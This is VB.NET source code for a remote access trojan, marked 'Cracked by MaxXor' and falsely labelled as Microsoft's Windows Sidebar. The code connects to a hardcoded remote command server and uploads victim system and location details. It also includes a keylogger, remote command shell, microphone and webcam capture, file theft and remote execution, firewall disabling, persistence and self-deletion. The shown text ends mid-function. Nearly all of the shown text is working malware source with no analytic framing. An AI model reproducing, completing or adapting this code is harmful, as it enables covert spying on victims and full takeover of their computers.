' Cracked by MaxXor

Option Strict Off
Option Explicit Off

#Region " Imports "
Imports System
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading
Imports System.IO
Imports System.Text
Imports System.Windows.Forms
Imports System.Drawing
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports Microsoft.Win32
Imports System.Collections.Generic
Imports System.Collections
Imports System.Data
Imports System.Drawing.Imaging
Imports System.Management
Imports System.Net.NetworkInformation
Imports System.Text.RegularExpressions
Imports System.Globalization
Imports System.Security.Principal
Imports System.ComponentModel
Imports System.Security.Cryptography
Imports System.Security.AccessControl
Imports System.Runtime.Serialization.Formatters.Binary

Imports AForge.Video, AForge.Video.DirectShow
Imports System.IO.Compression

<Assembly: AssemblyTitleAttribute("Windows Sidebar")> 
<Assembly: AssemblyDescriptionAttribute("Windows Desktop Gadgets")>
<Assembly: AssemblyCompanyAttribute("Microsoft")> 
<Assembly: AssemblyProductAttribute("Microsoft Windows Operating System")> 
<Assembly: AssemblyCopyrightAttribute("Microsoft Corperation. All rights reserved.")> 
<Assembly: AssemblyVersion("1.0.7600.1638")> 
<Assembly: AssemblyFileVersion("1.0.7600.1638")> 
#End Region

#Region " Main Module "

Module MainModule

#Region "Declarations"
    Public Const serverVersion As String = "2.0.1.9"
    Public SplitMark1 As Char = Chr(5)
    Public splitMark2 As Char = Chr(6)
    Public mainInfo As String
    Public compilerSettings As CompilerStructure
    Private connectionClient As TcpClient
    Public remoteHost As String = "viridianhf.no-ip.info"
    Public remotePort As Integer = 9002
    Private serverMutex As Mutex
    Private keyloggerHook As KeyHook
    Private remoteCmd As RemoteCMD
    Private connectionBuffer(8192 - 1) As Byte
    Private connectionStream As NetworkStream
    Public pressedKeys As String = Nothing
    Public liveKeys As String = Nothing
    Public viewedWindows As String = Nothing
    Private readerThread As Thread
    Private thumbnailThread As Thread
    Public liveLogger As Boolean = False
    Dim connectionThread As Thread
    Dim connectionInformation As Thread


    Private Const Salt As String = "#SALT"
    Private Const Key As String = "#KEY"

#End Region

#Region "Loading"
    Public Sub Main()
        Try
            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf MyResolveEventHandler
            Mutex()
            InitValues()
        Catch ex As Exception
        End Try
    End Sub
    Function MyResolveEventHandler(sender As Object, args As ResolveEventArgs) As Reflection.Assembly
        Try
            If args.Name.ToLower().Contains("aforge") Then
                '  MsgBox(args.Name)
                If args.Name.ToLower.Contains("directshow") Then
                    Dim resourceManager As New Resources.ResourceManager("f67169dfbf72c4ca285e9ee12e3e9ac5", Assembly.GetExecutingAssembly())
                    Dim resourceBytes As Byte() = DirectCast(resourceManager.GetObject("f7cbe59e99a90b5cef6f94f966fd"), Byte()) 'directshow
                    Return Reflection.Assembly.Load(Decompress(resourceBytes))
                Else
                    Dim resourceManager As New Resources.ResourceManager("ae3e83e2fab3a7d8683d8eefabd1e74d", Assembly.GetExecutingAssembly())
                    Dim resourceBytes As Byte() = DirectCast(resourceManager.GetObject("f13c496ecf7fd777ceb9e79ae285"), Byte()) ' aforgevideo
                    Return Reflection.Assembly.Load(Decompress(resourceBytes))
                End If
            End If
        Catch ex As Exception
        End Try

    End Function
    Public Function Decompress(data As Byte()) As Byte()
        Dim input As New MemoryStream()
        input.Write(data, 0, data.Length)
        input.Position = 0
        Dim gzip As New GZipStream(input, CompressionMode.Decompress, True)
        Dim output As New MemoryStream()
        Dim buff As Byte() = New Byte(63) {}
        Dim read As Integer = -1
        read = gzip.Read(buff, 0, buff.Length)
        While read > 0
            output.Write(buff, 0, read)
            read = gzip.Read(buff, 0, buff.Length)
        End While
        gzip.Close()
        Return output.ToArray()
    End Function
    Dim objMutex As Mutex
    Public Sub Mutex()
        Try
            objMutex = New Mutex(False, "{]=YX[[$Y=8Q<*8[O/I5PYFFY4MYBUEROX4<19ZK>#!]2@7TEW$3")
            If objMutex.WaitOne(0, False) = False Then
                objMutex.Close()
                objMutex = Nothing
                End
            End If
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region "Structures"
    Public Structure CompilerStructure
        Dim remoteHost As String
        Dim remotePort As Integer
        Dim serverMutex As String
        Dim serverId As String
        Dim enableInstallation As Boolean
        Dim installationPath As InstallationPath
        Dim installationFileName As String
        Dim installationFolderName As String
        Dim enableHklm As Boolean
        Dim hklmServerName As String
        Dim enableHKCU As Boolean
        Dim hkcuServerName As String
        Dim enableExplorer As Boolean
        Dim explorerServerName As String
        Dim UseStartupFold As Boolean
        Dim StartupFoldname As String
        Dim meltFile As Boolean
        Dim hideFile As Boolean
        Dim disableTaskManager As Boolean
        Dim editCreationDate As Boolean
        Dim disableZoneChecks As Boolean
        Dim bsodProection As Boolean
        Dim kernalSecurityProtection As Boolean
        Dim registryPersistence As Boolean
        Dim executeAsAdministrator As Boolean
    End Structure

    Public Enum InstallationPath
        Local = 1
        Roaming = 2
        Temp = 3
        Users = 4
    End Enum

#End Region

#Region "Logging"
    Public Property LogLive() As Boolean

        Get
            Return liveLogger
        End Get
        Set(ByVal value As Boolean)
            liveLogger = value
        End Set
    End Property
    Public Sub StartHook()
        Try
            Dim T As New Thread(AddressOf GetWindow)
            T.SetApartmentState(ApartmentState.STA)
            T.Start()
            keyloggerHook = New KeyHook
            keyloggerHook.Hook()
            Dim saveThread As New Thread(AddressOf SaveLogs)
            saveThread.SetApartmentState(ApartmentState.STA)
            saveThread.IsBackground = True
            saveThread.Start()
            AddHandler keyloggerHook.KD, AddressOf Pressed
        Catch ex As Exception
        End Try
    End Sub

    Public Sub Pressed(ByVal Key As Keys)
        If liveLogger = True Then
            liveKeys &= keyloggerHook.Feed(Key)
        End If
        pressedKeys &= keyloggerHook.Feed(Key)
    End Sub

    Public Sub GetWindow()
        Try
            Do
                Thread.Sleep(300)
                If LastWindowStr <> GetActiveWindowTitle() Then
                    LastWindowStr = GetActiveWindowTitle()
                    pressedKeys &= vbNewLine & vbNewLine & "[" & LastWindowStr & "]" & vbNewLine
                    If liveLogger Then
                        liveKeys &= vbNewLine & vbNewLine & "[" & LastWindowStr & "]" & vbNewLine
                    End If
                End If
            Loop
        Catch ex As Exception

        End Try

    End Sub

    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Dim LastWindowStr As String = Nothing

    Private Function GetActiveWindowTitle() As String
        Try
            Dim rawWindow As String = New String(Chr(0), 255)
            GetWindowText(GetForegroundWindow, rawWindow, 255)
            rawWindow = rawWindow.Substring(0, InStr(rawWindow, Chr(0)) - 1)
            If rawWindow.Trim(Chr(0)).Trim = Nothing Then
            Else
                Return rawWindow.Trim(Chr(0)).Trim
            End If
            Return Nothing
        Catch ex As Exception

        End Try

    End Function
    Dim keyloggerPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Environment.UserName & ".txt"
    Private Sub SaveLogs()
        Try
            Do
                Dim logEncryption As New Encryption
                Thread.Sleep(5000)
                If pressedKeys <> Nothing Then
                    Try
                        Dim logFile As String = logEncryption.Decrypt("Imminent", File.ReadAllText(keyloggerPath))
                        File.WriteAllText(keyloggerPath, logEncryption.Encrypt("Imminent", logFile & pressedKeys))
                        pressedKeys = Nothing
                    Catch ex As Exception
                    End Try
                End If
            Loop
        Catch ex As Exception

        End Try

    End Sub

    Public Sub Sendkey(ByVal keyc As String)
        On Error Resume Next
        SendKeys.SendWait(keyc)
    End Sub
#End Region

#Region "Startup"
    Public Sub InitValues()
        Try
            Options()
            compilerSettings.serverId = "###999###"
            compilerSettings.remoteHost = remoteHost
            compilerSettings.remotePort = remotePort
            Dim locationStructure As SystemInformation.LocationInfo = SystemInformation.GetIPLatLong
            mainInfo = Chr(CommandType.MainInformation) & SplitMark1 & SystemInformation.LAN & SplitMark1 & SystemInformation.OS & SplitMark1 & SystemInformation.ComputerName & SplitMark1 & SystemInformation.Username & SplitMark1 & SystemInformation.Country & SplitMark1 & Chr(CamControl.HasCam) & SplitMark1 & SystemInformation.Antivirus & SplitMark1 & SystemInformation.Firewall & SplitMark1 & Chr(SystemInformation.Privileges) & SplitMark1 & SystemInformation.GetLastInputTime & SplitMark1 & GetActiveWindowTitle() & SplitMark1 & locationStructure.Longitude & "/" & locationStructure.Latitude & SplitMark1 & locationStructure.Country & SplitMark1 & locationStructure.City & SplitMark1 & locationStructure.State & SplitMark1 & locationStructure.ISP & SplitMark1 & locationStructure.Organization & SplitMark1 & compilerSettings.serverId & SplitMark1 & serverVersion & SplitMark1 & compilerSettings.remotePort & SplitMark1 & Salt & SplitMark1
            connectionThread = New Thread(AddressOf AttemptConnect)
            connectionThread.Start()
            Control.CheckForIllegalCrossThreadCalls = False
            StartHook()
            Dim logEncryption As New Encryption
            If Not File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Environment.UserName & ".txt") Then
                Dim sr As New StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Environment.UserName & ".txt")
                sr.Write(logEncryption.Encrypt("Imminent", "New Log Started " & Date.Now.ToString & vbNewLine))
                sr.Close()
                sr.Dispose()
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public Sub Options()
        Try
            compilerSettings.remoteHost = "###111###"
            compilerSettings.remotePort = "###222###"
            compilerSettings.serverMutex = "###333###"
            compilerSettings.enableInstallation = False
            compilerSettings.installationPath = 2
            compilerSettings.installationFileName = "###444###"
            compilerSettings.installationFolderName = "###555###"
            compilerSettings.enableHklm = False
            compilerSettings.hklmServerName = "###666###"
            compilerSettings.enableHKCU = False
            compilerSettings.hkcuServerName = "###777###"
            compilerSettings.enableExplorer = False
            compilerSettings.explorerServerName = "###888###"
            compilerSettings.serverId = "###999###"
            compilerSettings.UseStartupFold = False
            compilerSettings.meltFile = False
            compilerSettings.disableTaskManager = False
            compilerSettings.editCreationDate = False
            compilerSettings.disableZoneChecks = True
            compilerSettings.bsodProection = False
            compilerSettings.kernalSecurityProtection = True
            compilerSettings.registryPersistence = False
            compilerSettings.executeAsAdministrator = False
            compilerSettings.hideFile = False
            remoteHost = compilerSettings.remoteHost
            remotePort = compilerSettings.remotePort
            If compilerSettings.hideFile = True Then Hideme()
            If compilerSettings.kernalSecurityProtection Then SelfProtection.ProtectProcess()
            If compilerSettings.bsodProection Then SelfProtection.BsodProtect()
            If compilerSettings.meltFile Then Melt()
            If compilerSettings.disableTaskManager Then Dim T As New Thread(AddressOf DisableFunctions.DisableTaskManager) : T.Start(True)
            If compilerSettings.disableZoneChecks Then Installation.DisableWarning(Application.StartupPath, Application.ExecutablePath.Substring(Application.ExecutablePath.LastIndexOf("\", StringComparison.Ordinal) + 1))
            Select Case compilerSettings.installationPath
                Case 1
                    Installation.InstallationPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\"
                Case 2
                    Installation.InstallationPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\"
                Case 3
                    Installation.InstallationPath = Path.GetTempPath & "\"
                Case 4
                    Installation.InstallationPath = Environment.GetEnvironmentVariable("userprofile") & "\"
            End Select
            If compilerSettings.enableHKCU Then
                If compilerSettings.enableInstallation Then Installation.Install(compilerSettings.installationFileName, compilerSettings.installationFolderName, compilerSettings.hkcuServerName, Installation.InstallArea.Hkcu)
            End If
            If compilerSettings.enableHklm Then
                If compilerSettings.enableInstallation Then Installation.Install(compilerSettings.installationFileName, compilerSettings.installationFolderName, compilerSettings.hklmServerName, Installation.InstallArea.Hklm)
            End If
            If compilerSettings.enableExplorer Or compilerSettings.UseStartupFold Then
                If Not compilerSettings.installationFileName.Contains(".exe") Then compilerSettings.installationFileName = compilerSettings.installationFileName
                If compilerSettings.enableInstallation Then Installation.Install(compilerSettings.installationFileName, compilerSettings.installationFolderName, compilerSettings.hkcuServerName, Installation.InstallArea.StartupDir)
            End If
            If compilerSettings.enableInstallation Then
                If compilerSettings.registryPersistence Then
                    Dim T As New Thread(AddressOf Installation.RegPersistence)
                    T.Start()
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub
    Public Sub Hideme()
        Try
            Dim strFInfo As New FileInfo(Application.ExecutablePath)
            strFInfo.Attributes = FileAttributes.Hidden
        Catch
        End Try
    End Sub
    Public Sub Melt()
        Try
            Dim app As New FileInfo(Application.ExecutablePath)
            Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & app.Name.ToLower.Replace(".exe", "")
            If Application.StartupPath = path Then
            Else
                If Not (Directory.Exists(path)) Then
                    Directory.CreateDirectory(path)
                Else
                    For Each file As String In Directory.GetFiles(path & "\")
                        Dim MyFile As New FileInfo(file)
                        Dim filetoDelete As String = MyFile.FullName
                        IO.File.Delete(filetoDelete)
                    Next
                End If
                File.Copy(Application.ExecutablePath, path & "\" & app.Name.ToLower)
                Process.Start(path & "\" & app.Name.ToLower)
                SelfProtection.UnProtectProcess()
                SelfProtection.BSODUnProtect()
                Dim Info As ProcessStartInfo = New ProcessStartInfo()
                Info.Arguments = "/C ping 1.1.1.1 -n 1 -w 1000 > Nul & Del """ & Application.ExecutablePath.ToString & """"
                Info.WindowStyle = ProcessWindowStyle.Hidden
                Info.CreateNoWindow = True
                Info.FileName = "cmd.exe"
                Process.Start(Info)
                End
            End If
        Catch
        End Try
    End Sub
#End Region

#Region "Connection"
    Public Sub SendStatus(ByVal status As String)
        On Error Resume Next
        Send(Chr(CommandType.SendStatus) & status)

    End Sub
    Public Sub AttemptConnect()
        connectionClient = New TcpClient()
        While True
            Try
                Console.WriteLine(String.Format("Attemping to connect to: {0}:{1}", remoteHost, remotePort))
                ConnectionKey = "123456"
                connectionClient.Connect(remoteHost, remotePort)
                connectionClient.SendBufferSize = 8192
                connectionClient.ReceiveBufferSize = 8192
                Select Case connectionClient.Connected
                    Case True
                        connectionStream = connectionClient.GetStream()
                        Send(mainInfo)
                        ConnectionKey = "123456"
                        readerThread = New Thread(AddressOf Read)
                        readerThread.SetApartmentState(ApartmentState.STA)
                        readerThread.Start()
                        connectionInformation = New Thread(AddressOf SendGenericInfo)
                        connectionInformation.SetApartmentState(ApartmentState.STA)
                        connectionInformation.Start()
                        Console.WriteLine(String.Format("Connected to: {0}:{1}", remoteHost, remotePort))
                        Exit While
                End Select
            Catch ex As Exception

                Console.WriteLine(String.Format("Failed to connect to: {0}:{1}", remoteHost, remotePort, ex.Message))
                Thread.Sleep(4000)
            End Try
        End While
    End Sub
#End Region

#Region "Generic Data Sending Function"

    Public ConnectionKey As String = "123456"

    Public Function Send(ByVal data As String) As Boolean
        Try
            Dim Message As Byte()


            If data.Length = 1 Then
                Message = Encoding.UTF8.GetBytes(data & Chr(&H3))
            Else
                Dim E As New Encryption
                Message = Encoding.UTF8.GetBytes(data(0) & E.RXOREncrypt(data.Substring(1), ConnectionKey) & Chr(&H3))
            End If

            connectionClient.Client.SendBufferSize = Message.Length
            connectionStream.Write(Message, 0, Message.Length)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    Public Sub SendGenericInfo()

        Do
            Try
                Thread.Sleep(60000)
                Send(Chr(CommandType.GenericInfo) & SystemInformation.GetLastInputTime & SplitMark1 & GetActiveWindowTitle())
            Catch ex As Exception
                If Not connectionClient Is Nothing Then
                    If Not connectionClient.Connected Then Exit Sub
                Else
                    Exit Sub
                End If
            End Try
        Loop
    End Sub
#End Region

#Region "Read Data From Stream"
    Public Sub Read()
        Try
            While True
                If connectionStream.Read(connectionBuffer, 0, connectionBuffer.Length) = 0 Then Exit While
                HandleData(connectionBuffer)
                Array.Clear(connectionBuffer, 0, connectionBuffer.Length)
            End While
            AttemptConnect()
        Catch
            AttemptConnect()
        End Try
    End Sub
#End Region

#Region "Handle Data From Stream"
    Dim R As New Removal
    Public Const SCREEN_VIEW_START As Byte = 1
    Public Const SCREEN_VIEW_STOP As Byte = 2
    Public Sub HandleData(ByVal buf() As Byte)
        Try
            Dim S As New StressTesting()
            Dim commandString As String = System.Text.Encoding.UTF8.GetString(buf).Trim(Chr(0))
            Select Case buf(0)
                Case CommandType.Ping
                    Send(Chr(CommandType.Ping))
                    SendStatus("Ping request sent...")
                Case CommandType.IdleTime
                    Send(Chr(CommandType.IdleTime) & SystemInformation.GetLastInputTime)
                Case CommandType.ThumbTask

                    Select Case buf(1)
                        Case SCREEN_VIEW_START
                            If Not thumbnailThread Is Nothing Then
                                If thumbnailThread.IsAlive Then
                                    thumbnailThread.Abort()
                                End If
                            End If
                            thumbnailThread = New Thread(AddressOf StreamThumb)
                            thumbnailThread.IsBackground = True
                            thumbnailThread.SetApartmentState(ApartmentState.STA)
                            thumbnailThread.Start()
                        Case SCREEN_VIEW_STOP
                            If Not thumbnailThread Is Nothing Then
                                If thumbnailThread.IsAlive Then
                                    thumbnailThread.Abort()
                                End If
                            End If
                    End Select
                    Exit Select
                Case CommandType.Thumbnail
                    ImageManaging.SendThumbnail(commandString.Remove(0, 1))
                Case (CommandType.RemoteDesktop)
                    Dim Splits() As String = commandString.Split(SplitMark1)
                    Dim NewRemoteDesktop As New RemoteDesktop(Splits(1), remoteHost, compilerSettings.remotePort, Splits(2))
                    SendStatus("Remote desktop started...")
                    Exit Select
                Case CommandType.RemoteKeylogger
                    Dim Splits() As String = commandString.Split(SplitMark1)
                    Dim L As New LogManaging
                    L.InitializeTransfer(Splits(1), Asc(Splits(2)), Asc(Splits(3)), keyloggerHook)
                    SendStatus("Downloading keylogs...")
                    Exit Select
                Case CommandType.StartRemoteCMD
                    remoteCmd = New RemoteCMD(commandString.Split(SplitMark1)(1), remoteHost, compilerSettings.remotePort)
                    SendStatus("Opening remote cmd...")
                    Exit Select
                Case CommandType.RemoteCMDInput
                    WriteCmdInput(commandString.Split(SplitMark1)(1))
                    Exit Select
                Case CommandType.Processes
                    ProcessManaging.SendProcesses(commandString.Split(SplitMark1)(1))
                    SendStatus("Process list sent...")
                    Exit Select
                Case CommandType.Windows
                    WindowManaging.SendWindows(commandString.Split(SplitMark1)(1))
                    SendStatus("active windows sent...")
                    Exit Select
                Case CommandType.FilesFolders
                    FileManaging.SendFilesFolders(commandString)

                    Exit Select
                Case CommandType.KillProcess
                    If ProcessManaging.KillProcess(commandString.Split(SplitMark1)(1)) Then
                        SendStatus("Killed process: " & commandString.Split(SplitMark1)(1))
                    Else
                    End If
                    Exit Select
                Case CommandType.SuspendProcess
                    If ProcessManaging.SuspendProcess(commandString.Split(SplitMark1)(1)) Then
                        SendStatus("Suspend process: " & commandString.Split(SplitMark1)(1))
                    Else
                    End If
                    Exit Select
                Case CommandType.ResumeProcess
                    If ProcessManaging.ResumeProcess(commandString.Split(SplitMark1)(1)) Then
                        SendStatus("Resume process: " & commandString.Split(SplitMark1)(1))
                    Else
                    End If
                    Exit Select
                Case CommandType.FreezeWindow
                    If WindowManaging.FreezeWindow(commandString.Split(SplitMark1)(1)) Then
                        SendStatus("Window frozen: " & commandString.Split(SplitMark1)(1))
                    Else
                    End If
                    Exit Select
                Case CommandType.UnfreezeWindow
                    If WindowManaging.UnfreezeWindow(commandString.Split(SplitMark1)(1)) Then
                        SendStatus("Window unfrozen: " & commandString.Split(SplitMark1)(1))
                    Else
                    End If
                    Exit Select
                Case CommandType.SetText
                    Dim window As IntPtr = commandString.Split(SplitMark1)(1)
                    If WindowManaging.SetText(window, commandString.Split(SplitMark1)(2)) Then
                    Else
                    End If
                    Exit Select
                Case CommandType.WindowShow
                    If WindowManaging.WindowShow(commandString.Split(SplitMark1)(1)) Then
                        WindowManaging.WindowShow(commandString.Split(SplitMark1)(1))
                    Else
                    End If
                    Exit Select
                Case CommandType.WindowHide
                    If WindowManaging.WindowHide(commandString.Split(SplitMark1)(1)) Then
                        WindowManaging.WindowShow(commandString.Split(SplitMark1)(1))
                    Else
                    End If
                    Exit Select
                Case CommandType.CloseWindow
                    If WindowManaging.CloseWindow(commandString.Split(SplitMark1)(1)) Then
                    Else
                    End If
                    Exit Select
                Case CommandType.MinimizeWindow
                    If WindowManaging.MinimizeWindow(commandString.Split(SplitMark1)(1)) Then
                    Else
                    End If
                    Exit Select
                Case CommandType.RestoreWindow
                    If WindowManaging.RestoreWindow(commandString.Split(SplitMark1)(1)) Then
                    Else
                    End If
                    Exit Select
                Case CommandType.GetActiveWindow
                    WindowManaging.GetActiveWindow()
                    Exit Select
                Case CommandType.KeyDown
                    InputManaging.SendKeyString(commandString.Split(SplitMark1)(1))
                    Exit Select
                Case CommandType.KeyUp
                    InputManaging.KeyUp((commandString.Split(SplitMark1)(1)))
                    Exit Select
                Case CommandType.Uninstall
                    SelfProtection.UnProtectProcess()
                    SelfProtection.BSODUnProtect()
                    Installation.UninstallServer()
                    Installation.Selfdestruct(Application.ExecutablePath)
                    End
                Case CommandType.ShutdownComputer
                    SendStatus("Attempting to shutdown computer...")
                    Process.Start("shutdown", "-s -f")
                    Exit Select
                Case CommandType.RestartComputer
                    SendStatus("Attempting to restart computer...")
                    Process.Start("shutdown", "-r")
                    Exit Select
                Case CommandType.LogOff
                    SendStatus("Attempting to restart computer...")
                    Process.Start("shutdown", "-l")
                    Exit Select
                Case CommandType.Hibernate
                    SendStatus("Attempting to hibernate computer...")
                    Application.SetSuspendState(PowerState.Hibernate, True, True)
                    Exit Select
                Case CommandType.Suspend
                    SendStatus("Attempting to suspend computer...")
                    Application.SetSuspendState(PowerState.Suspend, True, True)
                    Exit Select
                Case CommandType.OpenCD
                    SendStatus("CD drive opened...")
                    mciSendStringA("set CDAudio door open", 0, 0, 0)
                    Exit Select
                Case CommandType.CloseCD
                    SendStatus("CD drive closed...")
                    mciSendStringA("set CDAudio door closed", 0, 0, 0)
                    Exit Select
                Case CommandType.HideTask
                    SetWindowPos(FindWindow("Shell_traywnd", ""), 0, 0, 0, 0, 0, &H80)
                    SendStatus("Task bar hidden...")
                    Exit Select
                Case CommandType.ShowTask
                    SetWindowPos(FindWindow("Shell_traywnd", ""), 0, 0, 0, 0, 0, &H40)
                    SendStatus("Take bar shown...")
                    Exit Select
                Case CommandType.LockTask
                    EnableWindow(CInt(FindWindow("Shell_traywnd", vbNullString)), 0)
                    SendStatus("Task bar locked...")
                    Exit Select
                Case CommandType.Unlocktask
                    EnableWindow(CInt(FindWindow("Shell_traywnd", vbNullString)), 1)
                    SendStatus("Task bar unlocked...")
                    Exit Select
                Case CommandType.MonOn
                    SendMessageA(-1, &H112, &HF170, 2)
                    SendStatus("Monitor on...")
                    Exit Select
                Case CommandType.MonOff
                    SendMessageA(-1, &H112, &HF170, -1)
                    SendStatus("Monitor off...")
                    Exit Select
                Case CommandType.MouseSwap
                    SwapMouseButton(&H100&)
                    SendStatus("Mouse swapped...")
                    Exit Select
                Case CommandType.MouseReturn
                    SwapMouseButton(&H0&)
                    SendStatus("Mouse restored...")
                    Exit Select
                Case CommandType.SendToWebsite
                    Select Case commandString.Split(SplitMark1)(3)
                        Case 0
                            Dim i As Integer
                            Do Until i = commandString.Split(SplitMark1)(2)
                                i = i + 1
                                Process.Start(commandString.Split(SplitMark1)(1))
                                Send(Chr(CommandType.SendToWebsite) & String.Format("Sent to site (visible): {0} times", i))
                            Loop

                            SendStatus("Sent to website...")
                        Case 1
                            For i As Integer = 0 To commandString.Split(SplitMark1)(2)
                                Dim headerString As String = New WebClient().DownloadString(commandString.Split(SplitMark1)(1))
                                Send(Chr(CommandType.SendToWebsite) & String.Format("Sent to site (hidden): {0} times", i))
                            Next
                            SendStatus("Sent to website hidden...")
                    End Select

                    Exit Select
                Case CommandType.HTML
                    Dim Path As String = Environ("Temp") & "\" & New Random().Next(1, 50000) & ".html"
                    Dim sr As New StreamWriter(Path, False)
                    sr.Write(commandString.Remove(0, 1))
                    sr.Close()
                    Process.Start(Path)
                    SendStatus("Html script executed...")
                    Exit Select
                Case CommandType.VBS
                    Dim Path As String = Environ("Temp") & "\" & New Random().Next(1, 50000) & ".vbs"
                    Dim sr As New StreamWriter(Path, False)
                    sr.Write(commandString.Remove(0, 1))
                    sr.Close()
                    Process.Start(Path)
                    SendStatus("VBS script executed...")
                    Exit Select
                Case CommandType.Batch
                    Dim Path As String = Environ("Temp") & "\" & New Random().Next(1, 50000) & ".bat"
                    Dim sr As New StreamWriter(Path, False)
                    sr.Write(commandString.Remove(0, 1))
                    sr.Close()
                    Process.Start(Path)
                    SendStatus("Batch script executed...")
                    Exit Select
                Case CommandType.Beep
                    My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Beep)
                    Exit Select
                Case CommandType.Asterisk
                    My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Asterisk)
                    Exit Select
                Case CommandType.Exclamation
                    My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                    Exit Select
                Case CommandType.Question
                    My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Question)
                    Exit Select
                Case CommandType.hand
                    My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Hand)
                    Exit Select
                Case CommandType.HideDesktop
                    Dim hWnd As IntPtr = FindWindow("ProgMan", Nothing)
                    hWnd = Native.GetWindow(hWnd, 5)
                    ShowWindow(hWnd, 0)
                    SendStatus("Desktop hidden...")
                    Exit Select
                Case CommandType.ShowDesktop
                    Dim hWnd As IntPtr = FindWindow("ProgMan", Nothing)
                    hWnd = Native.GetWindow(hWnd, 5)
                    ShowWindow(hWnd, 4)
                    SendStatus("Desktop shown...")
                    Exit Select
                Case CommandType.LockDesktop
                    Dim deskwin As Long = FindWindow("Progman", vbNullString)
                    EnableWindow(CInt(deskwin), 0)
                    SendStatus("Desktop locked...")
                    Exit Select
                Case CommandType.UnlockDesktop
                    Dim deskwin As Long = FindWindow("Progman", vbNullString)
                    EnableWindow(CInt(deskwin), 1)
                    SendStatus("Desktop unlocked...")
                    Exit Select
                Case CommandType.BlockInput
                    BlockInput(True)
                    SendStatus("Input blocked...")
                    Exit Select
                Case CommandType.UnblockInput
                    BlockInput(False)
                    SendStatus("Input unblocked...")
                    Exit Select
                Case CommandType.ShowStart
                    Dim n As IntPtr = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Shell_TrayWnd", vbNullString)
                    Dim startbtn As Long = FindWindowEx(n, IntPtr.Zero, "Button", vbNullString)
                    ShowWindow(startbtn, 9)
                    Exit Select
                Case CommandType.HideStart
                    Dim n As IntPtr = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Shell_TrayWnd", vbNullString)
                    Dim startbtn As Long = FindWindowEx(n, IntPtr.Zero, "Button", vbNullString)
                    ShowWindow(startbtn, 0)
                    Exit Select
                Case CommandType.SendKeyBoardText
                    InputManaging.SendKeyString(commandString.Split(SplitMark1)(1))
                    Exit Select
                Case CommandType.MsgBox
                    Dim t As New Thread(AddressOf Msg)
                    t.Start(commandString)
                    SendStatus("Messagebox shown...")
                    Exit Select
                Case CommandType.Downloader
                    Dim DlThr As New Thread(AddressOf DownloadThread)
                    DlThr.IsBackground = True
                    DlThr.SetApartmentState(ApartmentState.STA)
                    DlThr.Start(commandString)
                    SendStatus("Download started...")
                    Exit Select
                Case CommandType.DownloadExecTransfer
                    Dim DownloadTransferExec As New QuickTransfer(commandString)
                    SendStatus("Transfer started...")
                Case CommandType.DeleteFolder
                    Dim DeleteDirWithContents As New Thread(AddressOf FileManaging.DeleteFolder)
                    DeleteDirWithContents.SetApartmentState(ApartmentState.STA)
                    DeleteDirWithContents.Start(commandString.Split(SplitMark1)(1))
                    SendStatus("Folder deleted...")
                    Exit Select
                Case CommandType.DeleteFile
                    FileManaging.DeleteFile(commandString.Split(SplitMark1)(1))
                    SendStatus("File deleted...")
                    Exit Select
                Case CommandType.CreateFolder
                    IO.Directory.CreateDirectory(commandString.Split(SplitMark1)(1))
                    SendStatus("Folder created...")
                    Exit Select
                Case CommandType.Download
                    Dim SendFile As New Transfer(commandString)
                    SendStatus("Download started...")
                Case CommandType.Upload
                    Dim ReceiveFile As New Transfer(commandString)
                    SendStatus("Upload started...")
                Case CommandType.Executefile
                    Process.Start(commandString.Split(SplitMark1)(1))
                    SendStatus("File executed...")
                    Exit Select
                Case CommandType.Wallpaper
                    FileManaging.Wallpaper(commandString.Split(SplitMark1)(1))
                    SendStatus("Wallpaper set...")
                    Exit Select
                Case CommandType.Renamefile
                    FileManaging.RenameFile(commandString.Split(SplitMark1)(1), commandString.Split(SplitMark1)(2))
                    SendStatus("File renamed...")
                    Exit Select
                Case CommandType.RenameFolder
                    FileManaging.RenameFolder(commandString.Split(SplitMark1)(1), commandString.Split(SplitMark1)(2))
                    SendStatus("Folder renamed...")
                    Exit Select
                Case CommandType.ExecuteAsAdmin
                    Dim T As New Thread(AddressOf FileManaging.RunAsAdmin)
                    T.IsBackground = True
                    T.SetApartmentState(ApartmentState.STA)
                    T.Start(commandString)
                    Exit Select
                Case CommandType.Copy
                    FileManaging.Copy(commandString.Split(SplitMark1)(1), commandString.Split(SplitMark1)(2))
                    SendStatus("File copied...")
                    Exit Select
                Case CommandType.ListenMicrophone
                    Dim M As New Microphone(commandString)
                    SendStatus("Microphone started...")
                    Exit Select
                Case CommandType.ClipBoard
                    SendClipboardText()
                    SendStatus("Clipboard sent...")
                    Exit Select
                Case CommandType.SetClipBoard
                    My.Computer.Clipboard.SetText(commandString.Substring(1, commandString.Length - 1))
                    SendStatus("Clipboard set...")
                    Exit Select
                Case CommandType.DisableFirewall
                    DisableFunctions.DisableFirewall(True)
                    Exit Select
                Case CommandType.EnableFirewall
                    DisableFunctions.DisableFirewall(False)
                    Exit Select
                Case CommandType.DisableCMD
                    DisableFunctions.DisableCMD(True)
                    Exit Select
                Case CommandType.EnableCMD
                    DisableFunctions.DisableCMD(False)
                    Exit Select
                Case CommandType.DisableReg
